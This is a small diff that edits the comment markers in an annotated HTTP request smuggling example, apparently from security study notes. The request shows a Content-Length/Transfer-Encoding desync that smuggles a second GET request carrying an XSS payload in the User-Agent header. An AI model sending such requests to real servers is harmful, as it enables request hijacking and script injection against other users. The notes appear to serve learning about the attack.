@@ -386,9 +386,9 @@ Content-Length: 150
 Content-Type: application/x-www-form-urlencoded
 Transfer-Encoding: chunked  # <----- use by backend-end
 
-0 <----- end of request for the back-end
+0 #<----- end of request for the back-end
 
-GET /post?postId=3 HTTP/1.1   <----- 2nd request for back-end
+GET /post?postId=3 HTTP/1.1   # <----- 2nd request for back-end
 Content-Length: 5
 User-Agent:"><script>alert(1)</script> # <----- end of request for the front-end
 
